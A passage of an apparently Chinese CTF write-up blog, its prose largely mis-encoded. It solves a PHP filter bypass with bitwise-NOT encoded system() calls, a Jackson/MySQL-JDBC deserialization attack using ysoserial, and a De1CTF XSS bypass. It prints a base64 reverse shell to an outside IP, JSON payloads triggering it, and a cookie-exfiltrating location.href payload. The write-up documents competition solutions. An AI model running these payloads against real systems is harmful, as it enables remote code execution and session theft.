class="string">'â€¬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“flagåœ¨flag.phpä¸­ï¼Œç„¶åè¯»flag.phpã€‚</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224856202.png" alt="image-20200624224856202"></p>
<h1 id="0x03-hate-php"><a href="#0x03-hate-php" class="headerlink" title="0x03 hate-php"></a>0x03 hate-php</h1><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨å–åç»•è¿‡ï¼Œå¼€å§‹ç”¨çš„assert(next(getallheaders()))ï¼Œçœ‹ç½‘ä¸Šè¯´æ”¹UAå°±å¯ä»¥æ‰§è¡Œphpä»£ç ï¼Œæµ‹è¯•å¤±è´¥ï¼Œå¯ä»¥ç”¨assert(end(getallheaders()))ï¼Œendç›´æ¥å–çš„æ˜¯Connectionï¼Œç›´æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)()</span><br><span class="line">phpinfo()</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line">var_dump(end(getallheaders()))</span><br><span class="line">(~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)())</span><br><span class="line">end(getallheaders())</span><br><span class="line">(~%8C%86%8C%8B%9A%92)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line">system(end(getallheaders()))</span><br></pre></td></tr></table></figure>

<p>ç„¶å</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624230617477.png" alt="image-20200624230617477"></p>
<p>åæ¥çœ‹åˆ°å‚æ•°ä¹Ÿå¯ä»¥ç”¨å–åç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//print_r(get_defined_functions()['internal']);</span></span><br><span class="line">$a = <span class="string">"system"</span>; <span class="comment">//%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$b = <span class="string">"cat /flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$b);</span><br><span class="line"></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624231048058.png" alt="image-20200624231048058"></p>
<h1 id="0x04-zzmâ€™s-blog"><a href="#0x04-zzmâ€™s-blog" class="headerlink" title="0x04 zzmâ€™s blog"></a>0x04 <strong>zzmâ€™s blog</strong></h1><p>å¾—åˆ°pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporing.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporing.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assemble<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">     </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä½¿ç”¨äº†Jackson 2.9.9ä¹‹å‰çš„Javaåº”ç”¨ï¼Œå¦‚æœæœåŠ¡ä¾èµ–äº†mysql-connector-javaï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡æ‰€åœ¨æœºå™¨ä¸Šçš„æ–‡ä»¶ï¼Œå°±å¯èƒ½è¢«ä»»æ„è¯»å–ã€‚</p>
</blockquote>
<p>commons-collections æ˜¯3.2.1</p>
<p>å‚è€ƒ<a href="https://www.jianshu.com/p/dfd6f0ac9f00" target="_blank" rel="noopener">https://www.jianshu.com/p/dfd6f0ac9f00</a></p>
<p><a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625105055219.png" alt="image-20200625105055219"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#DNSlogæŸ¥çœ‹</span><br><span class="line">&#123;&quot;id&quot;:[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,&quot;jdbc:mysql:&#x2F;&#x2F;144.34.200.151:3306&#x2F;test?autoDeserialize&#x3D;true%20queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%20user&#x3D;yso_URLDNS_http:&#x2F;&#x2F;j5q6o0.dnslog.cn&quot;]&#125;</span><br><span class="line"></span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  8888 CommonsCollections5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS84ODg4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br><span class="line">#åå¼¹shell</span><br><span class="line">&#123;&quot;id&quot;:[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,&quot;jdbc:mysql:&#x2F;&#x2F;144.34.200.151:3306&#x2F;test?autoDeserialize&#x3D;true%26queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%26user&#x3D;yso_CommonsCollections6_bash%20-c%20&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS84ODg4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625104839414.png" alt="image-20200625104839414"></p>
<h1 id="0x05-laravel"><a href="#0x05-laravel" class="headerlink" title="0x05 laravel"></a>0x05 <strong>laravel</strong></h1>]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF Animal Crossing å¤ç°</title>
    <url>/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>è®°å½•å¤ç°DE1CTF çš„Animal Crossing</p>
<a id="more"></a>

<h1 id="Animal-Crossing"><a href="#Animal-Crossing" class="headerlink" title="Animal Crossing"></a>Animal Crossing</h1><p>é¢˜ç›®æ˜¯ä¸€ä¸ªå¯ä»¥è‡ªå·±ç¼–è¾‘çš„é€šè¡Œè¯ï¼Œç„¶åå¯ä»¥å°†ç¼–è¾‘å¥½çš„é“¾æ¥å‘é€ç»™ç®¡ç†å‘˜ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯xssæ‰“cookieäº†.</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514120745790.png" alt="image-20200514120745790"></p>
<p>é¦–å…ˆå‘ç°å­˜åœ¨CSP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°CSPå¯ä»¥åˆ©ç”¨<code>location.href  =  &quot;http://dddddd&quot;+document.cookie</code>æ¥ç»•è¿‡.</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°å¯¹islandå’Œimageå’Œfruitéƒ½è¿›è¡Œäº†ç¼–ç ï¼Œç„¶åå¯¹dataæ•°æ®è¿›è¡Œäº†æ£€æµ‹ï¼Œæ¯”èµ›æ—¶æ²¡æœ‰æ¢æµ‹å‡ºæ£€æµ‹çš„è§„åˆ™ï¼ˆå…¶å®æ—¶ä¸ä¼šxssï¼‰,èµ›åçœ‹äº†å®˜æ–¹çš„writeupçŸ¥é“é¢˜ç›®è®¾ç½®äº†ä¸¤å±‚waf</p>
<blockquote>
<h3 id="ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹"><a href="#ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹" class="headerlink" title="ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹"></a>ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var blackList &#x3D; []string&#123;</span><br><span class="line">	&#x2F;&#x2F;global</span><br><span class="line">	&quot;document&quot;, &quot;window&quot;, &quot;top&quot;, &quot;parent&quot;, &quot;global&quot;, &quot;this&quot;,</span><br><span class="line">	&#x2F;&#x2F;func</span><br><span class="line">	&quot;console&quot;, &quot;alert&quot;, &quot;log&quot;, &quot;promise&quot;, &quot;fetch&quot;, &quot;eval&quot;, &quot;import&quot;,</span><br><span class="line">	&#x2F;&#x2F;char</span><br><span class="line">	&quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&#96;&quot;, &quot;\\*&quot;, &quot;&amp;&quot;, &quot;#&quot;, &quot;%&quot;, &quot;\\\\&quot;,</span><br><span class="line">	&#x2F;&#x2F;key</span><br><span class="line">	&quot;if&quot;, &quot;set&quot;, &quot;get&quot;, &quot;with&quot;, &quot;yield&quot;, &quot;async&quot;, &quot;wait&quot;, &quot;func&quot;, &quot;for&quot;, &quot;error&quot;, &quot;string&quot;,</span><br><span class="line">	&#x2F;&#x2F;string</span><br><span class="line">	&quot;href&quot;, &quot;location&quot;, &quot;url&quot;, &quot;cookie&quot;, &quot;src&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é»‘åå•çš„ç»•è¿‡æ€è·¯æ— éé¿å¼€è¢«bançš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ï¼Œè¿™é‡Œå› ä¸ºgoçš„irisæ¡†æ¶é—®é¢˜ï¼ˆçœ‹ä¸å‡ºæ¥æ˜¯golangå§ï¼‰ï¼Œå¯¼è‡´<code>;</code>åçš„ä¸œè¥¿ä¼šè¢«åˆ æ‰ï¼Œå¯ä»¥ç”¨%0aç»•è¿‡</p>
<h3 id="ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ"><a href="#ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ" class="headerlink" title="ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ"></a>ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. å°†dataä¼ å…¥&#96;fmt.Sprintf(&quot;&#39;%s&#39;;&quot;, data)&#96;ï¼Œç„¶åè¿›è¡Œè¯­æ³•è§£æï¼Œè¿™é‡Œparseå¤±è´¥ç›´æ¥ban</span><br><span class="line">2. æ¥ç€éå†ASTè¿›è¡Œåˆ†æï¼š</span><br><span class="line">   1. VariableExpression&#x2F;AssignExpressionï¼Œæ‰€æœ‰å£°æ˜è¯­å¥&#x2F;èµ‹å€¼è¯­å¥ç›´æ¥ban</span><br><span class="line">   2. CallExpressionï¼Œæ‰€æœ‰å‡½æ•°è°ƒç”¨çš„ï¼Œä¸”calleeä¸ä¸ºIdentifierçš„ç›´æ¥ban</span><br><span class="line">      1. banï¼š&#96;test.test()&#96;ã€&#96;a[x]()&#96;</span><br><span class="line">      2. passï¼š&#96;test()&#96;</span><br><span class="line">   3. BracketExpressionï¼Œä¹Ÿå°±æ˜¯æˆå‘˜å¼•ç”¨ï¼ŒMemberä¸ä¸ºIdentifierçš„ç›´æ¥banï¼Œ</span><br><span class="line">      1. banï¼š&#96;a[1]&#96;ã€&#96;a[&#39;xx&#39;]&#96;</span><br><span class="line">      2. passï¼š&#96;a[x]&#96;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å±‚wafï¼Œå…¶å®åªè¦æ‘¸æ¸…bançš„å¥—è·¯ï¼Œé’ˆå¯¹æ€§æ‰¾åˆ°æ²¡è¢«å¤„ç†çš„è¯­æ³•æ¥ç»•è¿‡å³å¯ï¼Œè¿™é‡Œæˆ‘çš„é¢„æœŸè§£æ˜¯ç”¨throwä¼ é€’å˜é‡ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šå…¶ä»–èƒ½ç”¨çš„è¯­æ³•ï¼ˆäº‹å®è¯æ˜ç¡®å®æœ‰å¾ˆå¤š)</p>
</blockquote>
<p>æœ‰é»‘åå•çš„æ£€æµ‹è¿˜æœ‰å¯¹è¯­æ³•çš„æ£€æµ‹ï¼Œè¿™é‡Œå¦‚æœè§£æè¯­æ³•å‡ºé”™ç›´æ¥banï¼Œç„¶åç¦æ­¢å£°æ˜å’Œèµ‹å€¼è¯­å¥ï¼Œ</p>
<blockquote>
<p>VariableExpressionï¼ˆå˜é‡è¡¨è¾¾å¼ï¼‰</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514175330303.png" alt="image-20200514175330303"></p>
<p>AssignExpressionï¼ˆèµ‹å€¼è¯­å¥ï¼‰</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183823187.png" alt="image-20200514183823187"></p>
<p>Identifierï¼ˆæ ‡è¯†ç¬¦ï¼‰</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183717571.png" alt="image-20200514183717571"></p>
<p>CallExpressionï¼ˆè°ƒç”¨è¡¨è¾¾å¼ï¼‰</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183650960.png" alt="image-20200514183650960"></p>
<p>BracketExpressionï¼ˆæ‹¬å·è¡¨è¾¾å¼ï¼Œå°±æ˜¯æˆå‘˜å¼•ç”¨ï¼‰</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183743248.png" alt="image-20200514183743248"></p>
</blockquote>
<p>ç»¼ä¸Šï¼Œåœ¨dataä¸­ä¸èƒ½å‡ºç°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let a &#x3D; &#39;dd&#39;;</span><br><span class="line">a &#x3D; &quot;ddddd&quot;;</span><br><span class="line">window.open(&quot;dd&quot;);</span><br><span class="line">window[&#39;open&#39;](&quot;dd&quot;);</span><br><span class="line">ç­‰ç­‰ä¹‹ç±»çš„</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç°è´´ä¸Šå‡ºé¢˜äººçš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YWxlcnQoMSk&#x3D;%27%0atry&#123;throw%20%27ev%27%2b%27al%27&#125;catch(e)&#123;try&#123;throw%20frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>alert(1)&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;YWxlcnQoMSk=</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514200937385.png" alt="image-20200514200937385"></p>
<p>æŠŠé¢˜ç›®é‡Œçš„éƒ¨åˆ†ä»£ç æŠ å‡ºæ¥ï¼Œå‡ºé¢˜äººçš„payloadå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514210649103.png" alt="image-20200514210649103"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">data=<span class="string">'YWxlcnQoMSk='</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'ev'</span> + <span class="string">'al'</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> frames[e]</span><br><span class="line">    &#125; <span class="keyword">catch</span>(c) &#123;</span><br><span class="line">        c(atob(data))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•å‘ç°ç¡®å®èƒ½å¤Ÿç»•è¿‡wafï¼Œä¹‹å‰ä¹Ÿæ²¡æœ‰ç”¨è¿‡go,æ‰€ä»¥å‡ºé¢˜äººçš„è¿™å¥è¯æ²¡æ¸…æ¥šä»€ä¹ˆæ„æ€ï¼Œæœ‰çŸ¥é“çš„å¸ˆå‚…å¯ä»¥ç»™æˆ‘è®²è®²ã€‚</p>
<blockquote>
<p>è¿™é‡Œå› ä¸ºgoçš„irisæ¡†æ¶é—®é¢˜ï¼ˆçœ‹ä¸å‡ºæ¥æ˜¯golangå§ï¼‰ï¼Œå¯¼è‡´<code>;</code>åçš„ä¸œè¥¿ä¼šè¢«åˆ æ‰ï¼Œå¯ä»¥ç”¨%0aç»•è¿‡</p>
</blockquote>
<p>å°†<code>location.href = &quot;http://vps:8888/?flag=&quot;+document.cookie</code>base64ç¼–ç ï¼Œç„¶åå‘è¿‡å»</p>
<p>å¦å¤–è®°å½•ä¸‹ä¸€å¶é£˜é›¶å¸ˆå‚…çš„payloadï¼Œæ„Ÿè§‰é‡‡ç”¨çš„æ–¹æ³•å’ŒNPUCTFçš„éªŒè¯ğŸé‚£é“é¢˜å¾ˆåƒï¼Œå…ˆè´´å‡ºpayload</p>
